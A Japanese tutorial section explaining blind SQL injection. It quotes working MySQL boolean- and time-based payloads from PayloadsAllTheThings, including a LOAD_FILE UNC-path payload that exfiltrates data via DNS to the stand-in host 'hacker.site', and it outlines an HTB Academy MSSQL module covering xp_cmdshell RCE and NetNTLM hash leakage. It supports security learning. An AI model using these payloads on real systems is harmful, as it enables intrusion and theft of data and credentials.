## Blindペイロードと難所モジュール

前節までで、レスポンス本文にDBの出力が直接現れる状況（UNIONベース・エラーベース）を扱った。しかし実務で遭遇するSQLiの多くは、アプリケーションが「正常」「エラー」あるいは「何も返さない」という数種類の状態しか見せてくれない**ブラインドSQLi（Blind SQLi）**である。この節では、MySQLに対する具体的なboolean-based / time-basedペイロードの実物を PayloadsAllTheThings（以下PATT）から抽出し、その裏側で何が起きているかをパーサ・関数実装のレベルで解説する。続けて、より難易度の高いMSSQL特化のHTB Academy「Blind SQL Injection」モジュールがどのような技法体系（OOB/DNS、RCE、NetNTLMハッシュ窃取まで）をカバーしているかを、モジュール構成に沿って紹介する。読者はboolean-basedの基礎自体は既知の中〜上級者を想定するため、用語の初出解説は最小限にとどめ、「なぜその関数・その構文でデータが1ビットずつ漏れるのか」という内部動作の説明に重点を置く。

### Blind SQLiの分類とオラクル設計という考え方

ブラインドSQLiは、攻撃者が観測できる情報の種類によって大きく2つに分かれる。

- **Boolean-based blind**: 注入した条件式の真偽によって、レスポンスの内容（文言、HTTPステータス、返却件数、ページの構造など）が変化する場合に使う。攻撃者は「真のときに現れる差分」と「偽のときに現れる差分」を1つ見つければ、それを1ビットの判定装置（オラクル）として使い、任意のブール条件をこの装置に通すことでデータを1文字ずつ、あるいは1ビットずつ復元できる。
- **Time-based blind**: レスポンスの内容に一切差分がない（真偽で見た目が完全に同じ）場合に使う。注入した条件式が真のときだけDBに意図的な遅延を発生させる関数を実行させ、レスポンスタイムの差（例: 通常0.2秒 vs 条件成立時10秒）を観測してオラクルとする。

どちらの手法も、本質は「二値の答えしか返らない質問器（オラクル）をどう設計するか」に尽きる。この「オラクル設計（Designing the Oracle）」という言い方自体、後述のHTB Academyモジュールのセクション名に明示的に登場する考え方であり、blind SQLiを体系的に学ぶ上での核心概念である。

### PayloadsAllTheThings: MySQL向けboolean-basedペイロード

PATTのMySQL Injectionページは、boolean-basedブラインドを成立させるための代表的な文字列比較・抽出関数と、実際のペイロード例を列挙している。

#### 文字抽出関数

`SUBSTR()` / `SUBSTRING()` / `MID()` / `LEFT()` / `RIGHT()` はいずれも文字列の一部を切り出す関数であり、「対象文字列の n 文字目が何であるか」を1文字ずつ総当たりで確定させていく際の基本部品になる。`ASCII()` は文字を数値（コードポイント）に変換する関数で、文字同士の等価比較ではなく数値の大小比較（`>`, `<`, `>=` など）を使うことで、二分探索によって照合回数を大幅に減らせる点が重要である。単純な「1文字ずつ全パターンを試す」総当たりでは印字可能文字だけでも数十〜百回の問い合わせが必要になるが、`ASCII(...)` を数値として二分探索すれば、1文字あたりの問い合わせ回数を log2(文字コード範囲) 程度（例えば0〜255の範囲なら最大8回）まで圧縮できる。これがboolean-based blindの効率化における最重要テクニックである。

```sql
2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```

> 出典: PayloadsAllTheThings MySQL Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md

このペイロードは `IF()` 関数（第1引数の条件が真なら第2引数、偽なら第3引数を返す、MySQL独自の3引数関数）と `MID()` を組み合わせている。`@@version` はMySQLのシステム変数で、稼働中のサーバーバージョン文字列を保持している。`MID(@@version,1,1)` でバージョン文字列の先頭1文字を切り出し、それが `'5'` かどうかを判定材料にすることで、「MySQL 5系かどうか」という1ビットの情報をブール差分（または後述のsleep遅延）に変換している。

```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
```

`information_schema.tables` はMySQLが自動的に維持しているメタデータビューであり、そのDB内に存在するすべてのテーブル名を保持している。ここから `table_name` を1文字ずつ抽出し、辞書順比較（`>`）や `ASCII()` による数値比較で絞り込んでいくことで、テーブル一覧を直接見ることができない状況でもテーブル名を丸ごと復元できる。`ASCII(LOWER(SUBSTR(version(),1,1)))=51` の `51` はASCIIコード `51 = '3'` に対応しており、バージョン番号の先頭桁が `3` かどうかを問うている（`LOWER()` は大文字小文字の揺れを吸収するための前処理）。

#### MAKE_SETを使った比較

```sql
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)
```

`MAKE_SET(bits, str1, str2, ...)` は本来、ビットマスクに応じて文字列を連結して返すMySQL関数だが、ここでは変則的な使い方として、第1引数に比較式（真偽値、MySQLでは真=1・偽=0として扱われる）を渡すことで、条件式の真偽をそのままクエリの一部として評価させるトリックに使われている。WAFやフィルタが `IF(` や典型的な boolean-based のシグネチャ（`AND 1=1` など）だけを検知対象にしている場合、`MAKE_SET` のような「本来別用途の関数を条件評価器に転用する」パターンは検知網をすり抜けやすい。これは、WAFのシグネチャ検知が「構文パターンのブラックリスト」に依存する限り原理的に迂回され得る、という一般則の具体例でもある。

#### LIKE / REGEXPによるパターンマッチ

```sql
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --
' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --
' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --
```

`LIKE` はワイルドカード（`%` = 任意長の任意文字列、`_` = 任意の1文字）によるパターン一致演算子であり、`REGEXP` はPOSIX正規表現によるマッチングを行う演算子である。`^.{8,}$` は「8文字以上」という長さ制約、`[0-9]` は「数字を含むかどうか」、`^a[a-z]` は「先頭が `a` で2文字目が小文字アルファベット」という条件をそれぞれ表す。これらは単一の等価比較よりも表現力が高く、1回の問い合わせで得られる情報量（真になる確率の絞り込み幅）を調整しやすいという利点がある。ただし正規表現エンジンの実装（MySQLはバージョンによってPOSIX正規表現ライブラリまたはICU正規表現エンジンを使用しており、5.7以前と8.0以降で構文互換性に差異がある）に依存するため、対象バージョンの確認が必要になる点は明記しておく。

### time-basedブラインド: なぜ「遅延」で1ビットが伝わるのか

boolean差分がレスポンス本文やステータスコードにまったく現れない場合（例えばアプリが常に同じ「エラー」ページしか返さない、あるいはレスポンスが完全に同一で差分検知の余地がない場合）、攻撃者は代わりに**処理時間**という、DBがブール条件の真偽を評価するために必ず消費する副作用を観測する。

#### BENCHMARK()（MySQL 4/5系で広く使われた古典手法）

```sql
+BENCHMARK(40000000,SHA1(1337))+
AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
```

`BENCHMARK(count, expr)` は本来、指定した式 `expr` を `count` 回繰り返し実行し、その所要時間を計測するためのベンチマーク用関数である。`count` に非常に大きな数値（例では4000万回）を渡すことで、`SHA1()` や `MD5()` のようなCPU負荷の高いハッシュ計算を大量に繰り返させ、意図的に処理時間を引き延ばしている。この手法は「遅延させたい秒数」を直接指定できないという欠点があり（実行環境のCPU性能によって同じ `count` でも所要時間が変動する）、後述の `SLEEP()` に比べて再現性・移植性に劣る。この不安定さのため、現在の実務ではBENCHMARKよりSLEEPが優先して使われる傾向にあるが、SLEEP関数がなんらかの理由で無効化・フィルタされている環境では依然として有効な代替手段になり得る。

#### SLEEP()（MySQL 5以降で標準的な手法）

```sql
RLIKE SLEEP([SLEEPTIME])
OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR
AND SLEEP(10)=0
```

`SLEEP(n)` はMySQL 5.0.12以降で実装された関数で、呼び出されると接続スレッドを `n` 秒間確実にブロックしてから `0` を返す。`BENCHMARK` と違い、CPU性能に依存せず常に一定秒数だけ遅延させられる点が最大の利点である。`XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR` は一見奇妙な構文に見えるが、これは既存クエリの構文構造を壊さずに条件式を挟み込むための「接続子トリック」であり、`NOW()=SYSDATE()` という常に真になる（クエリキャッシュを無効化するためにあえて実時刻関数を比較している、という説もある）判定式を土台にしている点が特徴である。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#
```

`FROM DUAL` はMySQLにおいて「実テーブルを参照しない、値を評価するためだけのダミーテーブル」を表す構文糖衣である。`SELECT SLEEP(10) FROM DUAL WHERE <条件>` という形にすると、`WHERE` 句の条件が真のときだけ `SELECT` 文が評価され、その評価過程で `SLEEP(10)` が実行される。`DATABASE() LIKE '%'` から `LIKE '___'`（アンダースコア3個 = 3文字）、さらに `LIKE 'A____'`（先頭が `A` で計5文字）と条件を絞り込んでいく過程は、まず「DB名の長さ」を確定させ、次に「先頭文字」を確定させるという、blind SQLiにおける定番の2段階抽出戦略（長さ→内容の順で総当たり空間を狭める）を体現している。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#
```

このペイロードはさらに一歩進んで、サブクエリで `information_schema.columns` から「カラム名に `pass` を含むテーブル」を1件（`LIMIT 0,1`）取得し、それを外側の `LIKE` 条件の対象にしている。パスワードらしきカラムを持つテーブルを機械的に発見するための、実戦的なテンプレートである。

```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
```

`IF(条件, 1, BENCHMARK(...))` という構造は、「条件が真なら軽い値 `1` を返して即座に終わる／条件が偽なら重い `BENCHMARK` を実行して意図的に遅らせる」という、boolean-basedとtime-basedのハイブリッドである。`ASCII(SUBSTRING((SELECT USER()),1,1))>=100` は「現在の接続ユーザー名の1文字目のASCIIコードが100以上か」という二分探索の一手にあたり、この形式を繰り返すことでユーザー名文字列全体を復元できる。

### OOB（Out-of-Band）/ DNSエクスフィルトレーション

boolean-basedもtime-basedも「HTTPレスポンスを1回ずつ観測する」必要があり、データ量が多いと問い合わせ回数（＝往復回数）が膨大になる。OOBはこの制約を迂回し、DBサーバー自身に**別のプロトコル経由**（典型的にはDNSクエリ）でデータを外部に送信させる手法である。

```sql
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
```

`LOAD_FILE()` は本来ローカルファイルを読み込むMySQL関数だが、引数にUNC形式のパス（`\\ホスト名\共有名\ファイル名` というWindows SMB共有のパス表記）を渡すと、Windows上で稼働するMySQLサーバーはこのホスト名を名前解決しようとする。`CONCAT('\\\\', VERSION(), '.hacker.site\\a.txt')` は、DBのバージョン文字列を**DNSクエリの中に埋め込む**ためのテクニックであり、生成されるホスト名はおおよそ `<VERSION()の値>.hacker.site` の形になる。攻撃者が `hacker.site` の権威DNSサーバーを制御していれば、このドメインへの名前解決クエリをサーバー側でログとして観測でき、HTTPレスポンスを一切介さずにDBの内部情報（この例ではバージョン文字列だが、原理的にはサブクエリの結果を任意にこの位置へ差し込める）を受け取れる。これがOOB/DNSエクスフィルトレーションの核心であり、HTTPレイヤーでの検知・遅延計測（time-based）を回避しつつ、実質的に無制限の情報量を1回のクエリで抜き出せる強力な手法である。ただし、対象サーバーがインターネット向けDNS解決を行えない（社内ネットワーク隔離・アウトバウンドDNSがフィルタされているなど）環境では機能しない点に留意する必要がある。

> 出典: PayloadsAllTheThings MySQL Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md

### HTB Academy「Blind SQL Injection」モジュール（MSSQL特化・Hard難度）

> ⚠️ **未取得の資料**: HTB Academyの「Blind SQL Injection」モジュール本文（各セクションの講義本文・演習）はログイン・購読が必要なコンテンツであり、自動取得の対象はモジュール概要（プレビュー）ページに限られました。理由: 本文コンテンツが認証必須（サブスクリプション）で、未認証のWebFetchではプレビュー情報（タイトル、難度、前提知識、セクション一覧、要約）のみが取得可能でした。詳細な講義本文・演習環境・スクリプト例をご覧になりたい場合は、以下のURLからご自身でログインの上直接ご覧ください: https://academy.hackthebox.com/course/preview/blind-sql-injection

（以下は未取得資料の補足として、取得できたプレビュー情報と一般知識に基づく解説です）

このモジュールは、Microsoft SQL Server（MSSQL）を対象としたBlind SQLiに特化した、難度「Hard」のコースである。前提として「SQL Injection Fundamentals」モジュールと「Introduction to Python3」モジュールの修了、およびWebアプリケーションの中級程度の理解が要求されており、単発のペイロード暗記ではなく、抽出処理を自動化するPythonスクリプトの自作までを到達目標に据えている点が、本節前半のPATTペイロード集との大きな違いである。

公開されている全16セクションの構成は次の通りである。

1. Introduction to MSSQL/SQL Server（MSSQL/SQL Serverの基礎）
2. Introduction to Blind SQL Injection（ブラインドSQLiの導入）
3. Identifying Boolean-based SQLi（boolean-basedの識別）
4. Designing the Oracle（オラクルの設計）
5. Extracting Data（データ抽出）
6. Optimizing（最適化）
7. Identifying Time-based SQLi（time-basedの識別）
8. Oracle Design（time-basedにおけるオラクル設計）
9. Data Extraction（time-basedでのデータ抽出）
10. Out-of-Band DNS（OOB/DNSエクスフィルトレーション）
11. Remote Code Execution（リモートコード実行）
12. Leaking NetNTLM Hashes（NetNTLMハッシュの窃取）
13. File Read（ファイル読み取り）
14. Tools of the Trade（実務で使われるツール）
15. Defending against SQL Injection（防御）
16. Skills Assessment（実技評価）

セクション構成から読み取れる本モジュールの設計思想は、boolean-basedとtime-basedそれぞれについて「識別（Identifying）→オラクル設計（Designing the Oracle）→データ抽出（Extracting Data）→最適化（Optimizing）」という同一の4段階フレームワークを繰り返し適用している点にある。これは本節冒頭で述べた「オラクル設計」という考え方が、単なる比喩ではなくHTB Academyが教育カリキュラムとして明示的に採用している方法論であることを裏付けている。

MySQL中心のPATTペイロード集と比較したとき、本モジュールがMSSQL特有の到達点としてカバーしている技法は次の3つである。

- **Out-of-Band DNS（セクション10）**: MySQLの `LOAD_FILE()` + UNCパスに相当する技法として、MSSQLでは拡張ストアドプロシージャ `xp_dirtree` や `xp_fileexist` にUNCパスを渡すことでSMB名前解決（したがってDNSクエリ）を発生させる手法が知られている。原理はMySQLの場合と同様で、DBサーバーにホスト名解決という「副チャネル」を踏ませ、攻撃者が制御するDNSサーバーでクエリを観測することでデータを抜き出す。
- **Remote Code Execution（セクション11）**: MSSQLには `xp_cmdshell` という拡張ストアドプロシージャがあり（既定では無効化されているが、`sp_configure` で有効化する権限を持つコンテキストからSQLi経由で有効化・実行されるケースがある）、これが有効化されるとOSコマンドを任意実行できる。SQLiがDB内部の情報漏えいにとどまらず、ホスト侵害にまで直結し得ることを最も直接的に示す到達点である。
- **Leaking NetNTLM Hashes（セクション12）**: 前述のUNCパス経由アクセス（`xp_dirtree` など）を悪用すると、MSSQLサーバーは攻撃者が用意したSMB共有に対して認証を試みる際、サーバーが動作しているWindowsマシンのサービスアカウントのNetNTLMハッシュ（チャレンジ・レスポンス形式の認証情報）を意図せず送出してしまう。攻撃者はこれを（Responderのようなツールで）捕捉し、オフラインクラッキングやNTLMリレー攻撃に転用できる。OOBチャネルが単なる「データ抜き出し経路」にとどまらず、「認証情報そのものを漏らす経路」にもなり得るという点は、MySQL環境のOOB/DNS技法にはない、MSSQL特有の重大な波及効果である。

> 出典: HTB Academy Blind SQL Injection（MSSQL）モジュール概要 — https://academy.hackthebox.com/course/preview/blind-sql-injection

### 両資料を通じた実務上の示唆

PATT（MySQL）とHTB Academy（MSSQL）を並べて読むと、DBMSが変わってもBlind SQLiの原理的骨格（真偽差分の観測、遅延関数によるビット伝送、OOBによる帯域外チャネルの確保）は共通している一方、それを実現する具体的な関数・構文（MySQLの `SLEEP()`/`BENCHMARK()`/`LOAD_FILE()` vs MSSQLの `WAITFOR DELAY`/`xp_dirtree`/`xp_cmdshell`）はDBMSごとの実装に強く依存することが分かる。攻撃側・防御側いずれの立場でも、「対象DBMSが何か」を最初に確定させる作業（バナー情報、エラーメッセージの方言、`@@version` や `SERVERPROPERTY('ProductVersion')` のようなDBMS固有関数への応答差）が、Blind SQLiの攻略ルート選定における最初の分岐点になる。また、time-basedやOOBは通信の往復回数やDNSインフラの準備コストが高く、boolean-basedより検知・調査コストが高い代わりに、レスポンス差分が一切ない厳しい環境でも機能する「最後の砦」的な位置づけにある、という技法間の優先順位づけも、両資料を通じて読み取れる重要な実務知見である。
